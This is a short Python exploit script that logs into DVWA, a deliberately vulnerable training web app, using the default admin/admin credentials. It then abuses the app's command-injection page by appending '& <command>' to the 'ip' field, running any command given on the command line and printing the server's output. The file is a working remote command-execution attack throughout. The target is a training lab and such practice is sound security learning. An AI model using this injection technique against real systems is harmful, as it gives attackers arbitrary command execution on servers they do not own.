import requests
import sys
from bs4 import BeautifulSoup

print(sys.argv[1])

proxyDict = { 
              "http"  : 'http://127.0.0.1:8080', 
              "https" : 'https://127.0.0.1:8080'
            }



host = sys.argv[1]
command = sys.argv[2]

s = requests.Session()
data = {
    'username': 'admin',
    'password':'admin',
    'Login':'Login'
}

# login
r = s.post(host + '/dvwa/login.php',data=data)


if 'Login' in r.text:
    print('[!] login failed!')
else:
    print('[+] Login successful!')

# ------- END LOGIN ---------------


def exec_command(com):
    url = host + '/dvwa/vulnerabilities/exec/'
    payload = '127.0.0.1 & ' + com
    data = {
        'ip': payload,
        'submit': 'submit'
    }
    r = s.post(url,data=data)
    soup = BeautifulSoup(r.text, 'html.parser')
    faze1 = str((soup.body.pre)).split('PING')[0]
    no_pre = faze1.strip('<pre>')
    print('[+] Result:')
    print(no_pre)

exec_command(command)
